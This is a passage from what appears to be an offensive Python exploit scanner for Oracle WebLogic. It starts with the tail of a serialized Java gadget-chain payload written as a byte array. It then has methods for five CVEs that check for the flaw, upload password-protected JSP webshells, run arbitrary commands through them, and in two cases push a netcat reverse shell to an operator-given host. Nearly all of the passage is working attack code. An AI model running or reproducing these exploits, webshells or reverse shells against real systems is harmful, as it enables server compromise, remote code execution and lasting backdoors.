            <void index="4516"><byte>2</byte></void>
            <void index="4517"><byte>0</byte></void>
            <void index="4518"><byte>8</byte></void>
            <void index="4519"><byte>0</byte></void>
            <void index="4520"><byte>1</byte></void>
            <void index="4521"><byte>0</byte></void>
            <void index="4522"><byte>1</byte></void>
            <void index="4523"><byte>0</byte></void>
            <void index="4524"><byte>10</byte></void>
            <void index="4525"><byte>0</byte></void>
            <void index="4526"><byte>11</byte></void>
            <void index="4527"><byte>0</byte></void>
            <void index="4528"><byte>1</byte></void>
            <void index="4529"><byte>0</byte></void>
            <void index="4530"><byte>12</byte></void>
            <void index="4531"><byte>0</byte></void>
            <void index="4532"><byte>0</byte></void>
            <void index="4533"><byte>0</byte></void>
            <void index="4534"><byte>47</byte></void>
            <void index="4535"><byte>0</byte></void>
            <void index="4536"><byte>1</byte></void>
            <void index="4537"><byte>0</byte></void>
            <void index="4538"><byte>1</byte></void>
            <void index="4539"><byte>0</byte></void>
            <void index="4540"><byte>0</byte></void>
            <void index="4541"><byte>0</byte></void>
            <void index="4542"><byte>5</byte></void>
            <void index="4543"><byte>42</byte></void>
            <void index="4544"><byte>-73</byte></void>
            <void index="4545"><byte>0</byte></void>
            <void index="4546"><byte>1</byte></void>
            <void index="4547"><byte>-79</byte></void>
            <void index="4548"><byte>0</byte></void>
            <void index="4549"><byte>0</byte></void>
            <void index="4550"><byte>0</byte></void>
            <void index="4551"><byte>2</byte></void>
            <void index="4552"><byte>0</byte></void>
            <void index="4553"><byte>13</byte></void>
            <void index="4554"><byte>0</byte></void>
            <void index="4555"><byte>0</byte></void>
            <void index="4556"><byte>0</byte></void>
            <void index="4557"><byte>6</byte></void>
            <void index="4558"><byte>0</byte></void>
            <void index="4559"><byte>1</byte></void>
            <void index="4560"><byte>0</byte></void>
            <void index="4561"><byte>0</byte></void>
            <void index="4562"><byte>0</byte></void>
            <void index="4563"><byte>60</byte></void>
            <void index="4564"><byte>0</byte></void>
            <void index="4565"><byte>14</byte></void>
            <void index="4566"><byte>0</byte></void>
            <void index="4567"><byte>0</byte></void>
            <void index="4568"><byte>0</byte></void>
            <void index="4569"><byte>12</byte></void>
            <void index="4570"><byte>0</byte></void>
            <void index="4571"><byte>1</byte></void>
            <void index="4572"><byte>0</byte></void>
            <void index="4573"><byte>0</byte></void>
            <void index="4574"><byte>0</byte></void>
            <void index="4575"><byte>5</byte></void>
            <void index="4576"><byte>0</byte></void>
            <void index="4577"><byte>15</byte></void>
            <void index="4578"><byte>0</byte></void>
            <void index="4579"><byte>18</byte></void>
            <void index="4580"><byte>0</byte></void>
            <void index="4581"><byte>0</byte></void>
            <void index="4582"><byte>0</byte></void>
            <void index="4583"><byte>2</byte></void>
            <void index="4584"><byte>0</byte></void>
            <void index="4585"><byte>19</byte></void>
            <void index="4586"><byte>0</byte></void>
            <void index="4587"><byte>0</byte></void>
            <void index="4588"><byte>0</byte></void>
            <void index="4589"><byte>2</byte></void>
            <void index="4590"><byte>0</byte></void>
            <void index="4591"><byte>20</byte></void>
            <void index="4592"><byte>0</byte></void>
            <void index="4593"><byte>17</byte></void>
            <void index="4594"><byte>0</byte></void>
            <void index="4595"><byte>0</byte></void>
            <void index="4596"><byte>0</byte></void>
            <void index="4597"><byte>10</byte></void>
            <void index="4598"><byte>0</byte></void>
            <void index="4599"><byte>1</byte></void>
            <void index="4600"><byte>0</byte></void>
            <void index="4601"><byte>2</byte></void>
            <void index="4602"><byte>0</byte></void>
            <void index="4603"><byte>22</byte></void>
            <void index="4604"><byte>0</byte></void>
            <void index="4605"><byte>16</byte></void>
            <void index="4606"><byte>0</byte></void>
            <void index="4607"><byte>9</byte></void>
            <void index="4608"><byte>112</byte></void>
            <void index="4609"><byte>116</byte></void>
            <void index="4610"><byte>0</byte></void>
            <void index="4611"><byte>4</byte></void>
            <void index="4612"><byte>80</byte></void>
            <void index="4613"><byte>119</byte></void>
            <void index="4614"><byte>110</byte></void>
            <void index="4615"><byte>114</byte></void>
            <void index="4616"><byte>112</byte></void>
            <void index="4617"><byte>119</byte></void>
            <void index="4618"><byte>1</byte></void>
            <void index="4619"><byte>0</byte></void>
            <void index="4620"><byte>120</byte></void>
            <void index="4621"><byte>115</byte></void>
            <void index="4622"><byte>125</byte></void>
            <void index="4623"><byte>0</byte></void>
            <void index="4624"><byte>0</byte></void>
            <void index="4625"><byte>0</byte></void>
            <void index="4626"><byte>1</byte></void>
            <void index="4627"><byte>0</byte></void>
            <void index="4628"><byte>29</byte></void>
            <void index="4629"><byte>106</byte></void>
            <void index="4630"><byte>97</byte></void>
            <void index="4631"><byte>118</byte></void>
            <void index="4632"><byte>97</byte></void>
            <void index="4633"><byte>120</byte></void>
            <void index="4634"><byte>46</byte></void>
            <void index="4635"><byte>120</byte></void>
            <void index="4636"><byte>109</byte></void>
            <void index="4637"><byte>108</byte></void>
            <void index="4638"><byte>46</byte></void>
            <void index="4639"><byte>116</byte></void>
            <void index="4640"><byte>114</byte></void>
            <void index="4641"><byte>97</byte></void>
            <void index="4642"><byte>110</byte></void>
            <void index="4643"><byte>115</byte></void>
            <void index="4644"><byte>102</byte></void>
            <void index="4645"><byte>111</byte></void>
            <void index="4646"><byte>114</byte></void>
            <void index="4647"><byte>109</byte></void>
            <void index="4648"><byte>46</byte></void>
            <void index="4649"><byte>84</byte></void>
            <void index="4650"><byte>101</byte></void>
            <void index="4651"><byte>109</byte></void>
            <void index="4652"><byte>112</byte></void>
            <void index="4653"><byte>108</byte></void>
            <void index="4654"><byte>97</byte></void>
            <void index="4655"><byte>116</byte></void>
            <void index="4656"><byte>101</byte></void>
            <void index="4657"><byte>115</byte></void>
            <void index="4658"><byte>120</byte></void>
            <void index="4659"><byte>114</byte></void>
            <void index="4660"><byte>0</byte></void>
            <void index="4661"><byte>23</byte></void>
            <void index="4662"><byte>106</byte></void>
            <void index="4663"><byte>97</byte></void>
            <void index="4664"><byte>118</byte></void>
            <void index="4665"><byte>97</byte></void>
            <void index="4666"><byte>46</byte></void>
            <void index="4667"><byte>108</byte></void>
            <void index="4668"><byte>97</byte></void>
            <void index="4669"><byte>110</byte></void>
            <void index="4670"><byte>103</byte></void>
            <void index="4671"><byte>46</byte></void>
            <void index="4672"><byte>114</byte></void>
            <void index="4673"><byte>101</byte></void>
            <void index="4674"><byte>102</byte></void>
            <void index="4675"><byte>108</byte></void>
            <void index="4676"><byte>101</byte></void>
            <void index="4677"><byte>99</byte></void>
            <void index="4678"><byte>116</byte></void>
            <void index="4679"><byte>46</byte></void>
            <void index="4680"><byte>80</byte></void>
            <void index="4681"><byte>114</byte></void>
            <void index="4682"><byte>111</byte></void>
            <void index="4683"><byte>120</byte></void>
            <void index="4684"><byte>121</byte></void>
            <void index="4685"><byte>-31</byte></void>
            <void index="4686"><byte>39</byte></void>
            <void index="4687"><byte>-38</byte></void>
            <void index="4688"><byte>32</byte></void>
            <void index="4689"><byte>-52</byte></void>
            <void index="4690"><byte>16</byte></void>
            <void index="4691"><byte>67</byte></void>
            <void index="4692"><byte>-53</byte></void>
            <void index="4693"><byte>2</byte></void>
            <void index="4694"><byte>0</byte></void>
            <void index="4695"><byte>1</byte></void>
            <void index="4696"><byte>76</byte></void>
            <void index="4697"><byte>0</byte></void>
            <void index="4698"><byte>1</byte></void>
            <void index="4699"><byte>104</byte></void>
            <void index="4700"><byte>116</byte></void>
            <void index="4701"><byte>0</byte></void>
            <void index="4702"><byte>37</byte></void>
            <void index="4703"><byte>76</byte></void>
            <void index="4704"><byte>106</byte></void>
            <void index="4705"><byte>97</byte></void>
            <void index="4706"><byte>118</byte></void>
            <void index="4707"><byte>97</byte></void>
            <void index="4708"><byte>47</byte></void>
            <void index="4709"><byte>108</byte></void>
            <void index="4710"><byte>97</byte></void>
            <void index="4711"><byte>110</byte></void>
            <void index="4712"><byte>103</byte></void>
            <void index="4713"><byte>47</byte></void>
            <void index="4714"><byte>114</byte></void>
            <void index="4715"><byte>101</byte></void>
            <void index="4716"><byte>102</byte></void>
            <void index="4717"><byte>108</byte></void>
            <void index="4718"><byte>101</byte></void>
            <void index="4719"><byte>99</byte></void>
            <void index="4720"><byte>116</byte></void>
            <void index="4721"><byte>47</byte></void>
            <void index="4722"><byte>73</byte></void>
            <void index="4723"><byte>110</byte></void>
            <void index="4724"><byte>118</byte></void>
            <void index="4725"><byte>111</byte></void>
            <void index="4726"><byte>99</byte></void>
            <void index="4727"><byte>97</byte></void>
            <void index="4728"><byte>116</byte></void>
            <void index="4729"><byte>105</byte></void>
            <void index="4730"><byte>111</byte></void>
            <void index="4731"><byte>110</byte></void>
            <void index="4732"><byte>72</byte></void>
            <void index="4733"><byte>97</byte></void>
            <void index="4734"><byte>110</byte></void>
            <void index="4735"><byte>100</byte></void>
            <void index="4736"><byte>108</byte></void>
            <void index="4737"><byte>101</byte></void>
            <void index="4738"><byte>114</byte></void>
            <void index="4739"><byte>59</byte></void>
            <void index="4740"><byte>120</byte></void>
            <void index="4741"><byte>112</byte></void>
            <void index="4742"><byte>115</byte></void>
            <void index="4743"><byte>114</byte></void>
            <void index="4744"><byte>0</byte></void>
            <void index="4745"><byte>50</byte></void>
            <void index="4746"><byte>115</byte></void>
            <void index="4747"><byte>117</byte></void>
            <void index="4748"><byte>110</byte></void>
            <void index="4749"><byte>46</byte></void>
            <void index="4750"><byte>114</byte></void>
            <void index="4751"><byte>101</byte></void>
            <void index="4752"><byte>102</byte></void>
            <void index="4753"><byte>108</byte></void>
            <void index="4754"><byte>101</byte></void>
            <void index="4755"><byte>99</byte></void>
            <void index="4756"><byte>116</byte></void>
            <void index="4757"><byte>46</byte></void>
            <void index="4758"><byte>97</byte></void>
            <void index="4759"><byte>110</byte></void>
            <void index="4760"><byte>110</byte></void>
            <void index="4761"><byte>111</byte></void>
            <void index="4762"><byte>116</byte></void>
            <void index="4763"><byte>97</byte></void>
            <void index="4764"><byte>116</byte></void>
            <void index="4765"><byte>105</byte></void>
            <void index="4766"><byte>111</byte></void>
            <void index="4767"><byte>110</byte></void>
            <void index="4768"><byte>46</byte></void>
            <void index="4769"><byte>65</byte></void>
            <void index="4770"><byte>110</byte></void>
            <void index="4771"><byte>110</byte></void>
            <void index="4772"><byte>111</byte></void>
            <void index="4773"><byte>116</byte></void>
            <void index="4774"><byte>97</byte></void>
            <void index="4775"><byte>116</byte></void>
            <void index="4776"><byte>105</byte></void>
            <void index="4777"><byte>111</byte></void>
            <void index="4778"><byte>110</byte></void>
            <void index="4779"><byte>73</byte></void>
            <void index="4780"><byte>110</byte></void>
            <void index="4781"><byte>118</byte></void>
            <void index="4782"><byte>111</byte></void>
            <void index="4783"><byte>99</byte></void>
            <void index="4784"><byte>97</byte></void>
            <void index="4785"><byte>116</byte></void>
            <void index="4786"><byte>105</byte></void>
            <void index="4787"><byte>111</byte></void>
            <void index="4788"><byte>110</byte></void>
            <void index="4789"><byte>72</byte></void>
            <void index="4790"><byte>97</byte></void>
            <void index="4791"><byte>110</byte></void>
            <void index="4792"><byte>100</byte></void>
            <void index="4793"><byte>108</byte></void>
            <void index="4794"><byte>101</byte></void>
            <void index="4795"><byte>114</byte></void>
            <void index="4796"><byte>85</byte></void>
            <void index="4797"><byte>-54</byte></void>
            <void index="4798"><byte>-11</byte></void>
            <void index="4799"><byte>15</byte></void>
            <void index="4800"><byte>21</byte></void>
            <void index="4801"><byte>-53</byte></void>
            <void index="4802"><byte>126</byte></void>
            <void index="4803"><byte>-91</byte></void>
            <void index="4804"><byte>2</byte></void>
            <void index="4805"><byte>0</byte></void>
            <void index="4806"><byte>2</byte></void>
            <void index="4807"><byte>76</byte></void>
            <void index="4808"><byte>0</byte></void>
            <void index="4809"><byte>12</byte></void>
            <void index="4810"><byte>109</byte></void>
            <void index="4811"><byte>101</byte></void>
            <void index="4812"><byte>109</byte></void>
            <void index="4813"><byte>98</byte></void>
            <void index="4814"><byte>101</byte></void>
            <void index="4815"><byte>114</byte></void>
            <void index="4816"><byte>86</byte></void>
            <void index="4817"><byte>97</byte></void>
            <void index="4818"><byte>108</byte></void>
            <void index="4819"><byte>117</byte></void>
            <void index="4820"><byte>101</byte></void>
            <void index="4821"><byte>115</byte></void>
            <void index="4822"><byte>116</byte></void>
            <void index="4823"><byte>0</byte></void>
            <void index="4824"><byte>15</byte></void>
            <void index="4825"><byte>76</byte></void>
            <void index="4826"><byte>106</byte></void>
            <void index="4827"><byte>97</byte></void>
            <void index="4828"><byte>118</byte></void>
            <void index="4829"><byte>97</byte></void>
            <void index="4830"><byte>47</byte></void>
            <void index="4831"><byte>117</byte></void>
            <void index="4832"><byte>116</byte></void>
            <void index="4833"><byte>105</byte></void>
            <void index="4834"><byte>108</byte></void>
            <void index="4835"><byte>47</byte></void>
            <void index="4836"><byte>77</byte></void>
            <void index="4837"><byte>97</byte></void>
            <void index="4838"><byte>112</byte></void>
            <void index="4839"><byte>59</byte></void>
            <void index="4840"><byte>76</byte></void>
            <void index="4841"><byte>0</byte></void>
            <void index="4842"><byte>4</byte></void>
            <void index="4843"><byte>116</byte></void>
            <void index="4844"><byte>121</byte></void>
            <void index="4845"><byte>112</byte></void>
            <void index="4846"><byte>101</byte></void>
            <void index="4847"><byte>116</byte></void>
            <void index="4848"><byte>0</byte></void>
            <void index="4849"><byte>17</byte></void>
            <void index="4850"><byte>76</byte></void>
            <void index="4851"><byte>106</byte></void>
            <void index="4852"><byte>97</byte></void>
            <void index="4853"><byte>118</byte></void>
            <void index="4854"><byte>97</byte></void>
            <void index="4855"><byte>47</byte></void>
            <void index="4856"><byte>108</byte></void>
            <void index="4857"><byte>97</byte></void>
            <void index="4858"><byte>110</byte></void>
            <void index="4859"><byte>103</byte></void>
            <void index="4860"><byte>47</byte></void>
            <void index="4861"><byte>67</byte></void>
            <void index="4862"><byte>108</byte></void>
            <void index="4863"><byte>97</byte></void>
            <void index="4864"><byte>115</byte></void>
            <void index="4865"><byte>115</byte></void>
            <void index="4866"><byte>59</byte></void>
            <void index="4867"><byte>120</byte></void>
            <void index="4868"><byte>112</byte></void>
            <void index="4869"><byte>115</byte></void>
            <void index="4870"><byte>114</byte></void>
            <void index="4871"><byte>0</byte></void>
            <void index="4872"><byte>17</byte></void>
            <void index="4873"><byte>106</byte></void>
            <void index="4874"><byte>97</byte></void>
            <void index="4875"><byte>118</byte></void>
            <void index="4876"><byte>97</byte></void>
            <void index="4877"><byte>46</byte></void>
            <void index="4878"><byte>117</byte></void>
            <void index="4879"><byte>116</byte></void>
            <void index="4880"><byte>105</byte></void>
            <void index="4881"><byte>108</byte></void>
            <void index="4882"><byte>46</byte></void>
            <void index="4883"><byte>72</byte></void>
            <void index="4884"><byte>97</byte></void>
            <void index="4885"><byte>115</byte></void>
            <void index="4886"><byte>104</byte></void>
            <void index="4887"><byte>77</byte></void>
            <void index="4888"><byte>97</byte></void>
            <void index="4889"><byte>112</byte></void>
            <void index="4890"><byte>5</byte></void>
            <void index="4891"><byte>7</byte></void>
            <void index="4892"><byte>-38</byte></void>
            <void index="4893"><byte>-63</byte></void>
            <void index="4894"><byte>-61</byte></void>
            <void index="4895"><byte>22</byte></void>
            <void index="4896"><byte>96</byte></void>
            <void index="4897"><byte>-47</byte></void>
            <void index="4898"><byte>3</byte></void>
            <void index="4899"><byte>0</byte></void>
            <void index="4900"><byte>2</byte></void>
            <void index="4901"><byte>70</byte></void>
            <void index="4902"><byte>0</byte></void>
            <void index="4903"><byte>10</byte></void>
            <void index="4904"><byte>108</byte></void>
            <void index="4905"><byte>111</byte></void>
            <void index="4906"><byte>97</byte></void>
            <void index="4907"><byte>100</byte></void>
            <void index="4908"><byte>70</byte></void>
            <void index="4909"><byte>97</byte></void>
            <void index="4910"><byte>99</byte></void>
            <void index="4911"><byte>116</byte></void>
            <void index="4912"><byte>111</byte></void>
            <void index="4913"><byte>114</byte></void>
            <void index="4914"><byte>73</byte></void>
            <void index="4915"><byte>0</byte></void>
            <void index="4916"><byte>9</byte></void>
            <void index="4917"><byte>116</byte></void>
            <void index="4918"><byte>104</byte></void>
            <void index="4919"><byte>114</byte></void>
            <void index="4920"><byte>101</byte></void>
            <void index="4921"><byte>115</byte></void>
            <void index="4922"><byte>104</byte></void>
            <void index="4923"><byte>111</byte></void>
            <void index="4924"><byte>108</byte></void>
            <void index="4925"><byte>100</byte></void>
            <void index="4926"><byte>120</byte></void>
            <void index="4927"><byte>112</byte></void>
            <void index="4928"><byte>63</byte></void>
            <void index="4929"><byte>64</byte></void>
            <void index="4930"><byte>0</byte></void>
            <void index="4931"><byte>0</byte></void>
            <void index="4932"><byte>0</byte></void>
            <void index="4933"><byte>0</byte></void>
            <void index="4934"><byte>0</byte></void>
            <void index="4935"><byte>12</byte></void>
            <void index="4936"><byte>119</byte></void>
            <void index="4937"><byte>8</byte></void>
            <void index="4938"><byte>0</byte></void>
            <void index="4939"><byte>0</byte></void>
            <void index="4940"><byte>0</byte></void>
            <void index="4941"><byte>16</byte></void>
            <void index="4942"><byte>0</byte></void>
            <void index="4943"><byte>0</byte></void>
            <void index="4944"><byte>0</byte></void>
            <void index="4945"><byte>1</byte></void>
            <void index="4946"><byte>116</byte></void>
            <void index="4947"><byte>0</byte></void>
            <void index="4948"><byte>8</byte></void>
            <void index="4949"><byte>102</byte></void>
            <void index="4950"><byte>53</byte></void>
            <void index="4951"><byte>97</byte></void>
            <void index="4952"><byte>53</byte></void>
            <void index="4953"><byte>97</byte></void>
            <void index="4954"><byte>54</byte></void>
            <void index="4955"><byte>48</byte></void>
            <void index="4956"><byte>56</byte></void>
            <void index="4957"><byte>113</byte></void>
            <void index="4958"><byte>0</byte></void>
            <void index="4959"><byte>126</byte></void>
            <void index="4960"><byte>0</byte></void>
            <void index="4961"><byte>9</byte></void>
            <void index="4962"><byte>120</byte></void>
            <void index="4963"><byte>118</byte></void>
            <void index="4964"><byte>114</byte></void>
            <void index="4965"><byte>0</byte></void>
            <void index="4966"><byte>29</byte></void>
            <void index="4967"><byte>106</byte></void>
            <void index="4968"><byte>97</byte></void>
            <void index="4969"><byte>118</byte></void>
            <void index="4970"><byte>97</byte></void>
            <void index="4971"><byte>120</byte></void>
            <void index="4972"><byte>46</byte></void>
            <void index="4973"><byte>120</byte></void>
            <void index="4974"><byte>109</byte></void>
            <void index="4975"><byte>108</byte></void>
            <void index="4976"><byte>46</byte></void>
            <void index="4977"><byte>116</byte></void>
            <void index="4978"><byte>114</byte></void>
            <void index="4979"><byte>97</byte></void>
            <void index="4980"><byte>110</byte></void>
            <void index="4981"><byte>115</byte></void>
            <void index="4982"><byte>102</byte></void>
            <void index="4983"><byte>111</byte></void>
            <void index="4984"><byte>114</byte></void>
            <void index="4985"><byte>109</byte></void>
            <void index="4986"><byte>46</byte></void>
            <void index="4987"><byte>84</byte></void>
            <void index="4988"><byte>101</byte></void>
            <void index="4989"><byte>109</byte></void>
            <void index="4990"><byte>112</byte></void>
            <void index="4991"><byte>108</byte></void>
            <void index="4992"><byte>97</byte></void>
            <void index="4993"><byte>116</byte></void>
            <void index="4994"><byte>101</byte></void>
            <void index="4995"><byte>115</byte></void>
            <void index="4996"><byte>0</byte></void>
            <void index="4997"><byte>0</byte></void>
            <void index="4998"><byte>0</byte></void>
            <void index="4999"><byte>0</byte></void>
            <void index="5000"><byte>0</byte></void>
            <void index="5001"><byte>0</byte></void>
            <void index="5002"><byte>0</byte></void>
            <void index="5003"><byte>0</byte></void>
            <void index="5004"><byte>0</byte></void>
            <void index="5005"><byte>0</byte></void>
            <void index="5006"><byte>0</byte></void>
            <void index="5007"><byte>120</byte></void>
            <void index="5008"><byte>112</byte></void>
            <void index="5009"><byte>120</byte></void></array>
            </void>
            </array>
               </java>
                </work:WorkContext>
               </soapenv:Header>
               <soapenv:Body>
                  <asy:onAsyncDelivery/>
               </soapenv:Body>
            </soapenv:Envelope>
            '''

    # 2020-09-17 complete.
    def cve_2014_4210(self):
        self.pocname = "Oracle Weblogic: CVE-2014-4210"
        self.method = "get"
        self.path = "/uddiexplorer/"
        self.r = "PoCWating"
        self.info = color.ssrf() + " [url:" + self.url + self.path + " ]"
        self.rawdata = "null"
        try:
            self.request = requests.get(self.url + self.path, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.request = requests.get(self.url + self.path, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8')
            if r"UDDI Explorer" in self.request.text and self.request.status_code == 200:
                self.r = "PoCSuCCeSS"
            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2017_3506(self):
        self.pocname = "Oracle Weblogic: CVE-2017-3506"
        self.info = color.upload()
        self.rawdata = "null"
        self.method = "post"
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.filename = self.name+".jsp"
        self.payload = self.payload_cve_2017_3506_exp.replace("REWEBSHELL", self.filename)
        try:
            if VULN is None:
                self.request = requests.post(self.url+"/wls-wsat/CoordinatorPortType", 
                    data=self.payload_cve_2017_3506_poc, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.request = requests.get(self.url+"/wls-wsat/test.log", headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url+"/wls-wsat/CoordinatorPortType", data=self.payload, 
                    headers=self.headers, timeout=TIMEOUT, verify=False)
                self.shellpath = self.url+"/wls-wsat/"+self.filename+"?pwd=password&cmd="+CMD
                self.request = requests.get(self.shellpath, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.r = "Upload Webshell: "+self.shellpath+"\n-------------------------\n"+self.request.text
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    # 2020-09-17 complete. support nc shell
    def cve_2017_10271(self):
        self.pocname = "Oracle Weblogic: CVE-2017-10271"
        self.info = color.de() + " [nc shell]"
        self.path = "/wls-wsat/CoordinatorPortType"
        self.method = "post"
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.filename = self.name+".jsp"
        self.payload = '<![CDATA[<% if("password".equals(request.getParameter("pwd"))){ java.io.InputStream in =' \
                'Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b =' \
                'new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } ' \
                'out.print("</pre>"); } %>]]>'
        self.poc = self.payload_cve_2017_10271.replace("REWEBSHELL", self.filename).replace("REPAYLOAD", ":-)")
        self.exp = self.payload_cve_2017_10271.replace("REWEBSHELL", self.filename).replace("REPAYLOAD", self.payload)
        self.rawdata = "null"
        try:
            if VULN is None:
                self.request = requests.post(self.url + self.path, data=self.poc, headers=self.headers, 
                    timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.shellpath = self.url+"/bea_wls_internal/"+self.filename
                self.request = requests.get(self.shellpath, headers=self.headers, timeout=TIMEOUT, verify=False)
                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.url + self.path, data=self.exp, headers=self.headers, timeout=TIMEOUT,
                                             verify=False)
                self.shellpath = self.url + "/bea_wls_internal/" + self.filename + "?pwd=password&cmd=" + CMD
                self.request = requests.get(self.shellpath, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.r = "Upload Webshell: " + self.shellpath + "\n-------------------------\n" + self.request.text
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                if CMD == "nc":
                    self.ncip = input(now.timed(de=DELAY)+color.green("[+] Nc host(ip): "))
                    self.ncport = input(now.timed(de=DELAY)+color.green("[+] Nc port: "))
                    self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
                    self.request = requests.post(self.url+"/wls-wsat/CoordinatorPortType", data=self.nc, 
                        headers=self.headers, timeout=TIMEOUT, verify=False)
                    if self.request.status_code == 500:
                        self.r = "NC-Succes"
                        verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                    else:
                        self.r = "NC-Failed"
                        verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2018_2894(self):
        self.pocname = "Oracle Weblogic: CVE-2018-2894"
        self.info = color.deupload()
        self.payload1 = "/ws_utc/resources/setting/options/general"
        self.rawdata = "null"
        self.r = "PoCWating"
        self.method = "get"
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.filename = self.name+".jsp"
        self.path = "/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/" \
            "com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css"
        self.data = {
            "setting_id": "general",
            "BasicConfigOptions.workDir": self.path,
            "BasicConfigOptions.proxyHost": "",
            "BasicConfigOptions.proxyPort": "80"
        }
        self.files = {
            "ks_edit_mode": "false",
            "ks_password_front": "null",
            "ks_password_changed": "true",
            "ks_filename": (self.filename, self.jsp_webshell)
        }
        self.headers = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
        }
        try:
            if VULN is None:
                self.request = requests.get(self.url+self.payload1, headers=headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                if self.request.status_code == 200 and r"BasicConfigOptions" in self.request.text:
                    self.r = "PoCSuCCeSS"
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.method = "post"
                self.request = requests.post(self.url+"/ws_utc/resources/setting/options", data=self.data, 
                    headers=self.headers, timeout=TIMEOUT, verify=False)
                self.request = requests.post(self.url+"/ws_utc/resources/setting/keystore", files=self.files, 
                    headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.match = re.findall("<id>(.*?)</id>", self.request.text)
                self.tid = self.match[-1]
                self.shellpath = self.url+"/ws_utc/css/config/keystore/"+str(self.tid)+"_"+self.filename
                self.request = requests.get(self.shellpath, headers=headers, timeout=TIMEOUT, verify=False)
                self.request = requests.get(self.shellpath+"?pwd=password&cmd="+CMD, headers=self.headers, 
                    timeout=TIMEOUT, verify=False)
                self.r = "Upload Webshell: "+self.shellpath+"\n-------------------------\n"+self.request.text
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2019_2725(self):
        self.pocname = "Oracle Weblogic: CVE-2019-2725"
        self.info = color.derce() + " [nc shell]"
        self.payload_path = "/_async/AsyncResponseService"
        self.rawdata = "null"
        self.r = "PoCWating"
        self.method = "post"
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.filename = self.name+".jsp"
        self.payload_webshell = self.payload_cve_2019_2725.replace("REWEBSHELL", self.filename)
        self.headers = {
            'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'content-type': 'text/xml'
        }
        try:
            if VULN is None:
                self.request = requests.get(self.url+self.payload_path, headers=headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                if r"AsyncResponseService" in self.request.text and r"Test page" and r"WSDL page" in self.request.text:
                    self.r = "PoCSuCCeSS"
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.method = "post"
                self.request = requests.post(self.url+"/_async/AsyncResponseService", data=self.payload_webshell, 
                    headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8')
                self.shellpath = self.url+"/_async/"+self.filename
                self.request = requests.get(self.shellpath+"?pwd=password&cmd="+CMD, headers=self.headers, 
                    timeout=TIMEOUT, verify=False)
                self.r = "Upload Webshell: "+self.shellpath+"\n-------------------------\n"+self.request.text
                if CMD == "nc":
                    self.ncip = input(now.timed(de=DELAY)+color.green("[+] Nc host(ip): "))
                    self.ncport = input(now.timed(de=DELAY)+color.green("[+] Nc port: "))
                    self.nc = self.weblogic_nc.replace("REIP", self.ncip).replace("REPORT", self.ncport)
                    self.request = requests.post(self.url+"/_async/AsyncResponseService", data=self.nc, 
                        headers=self.headers, timeout=TIMEOUT, verify=False)
                    if self.request.status_code == 202:
                        self.r = "NC-Succes"
                        verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                    else:
                        self.r = "NC-Failed"
                        verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            verify.connection_output(self.pocname)
        except Exception as error:
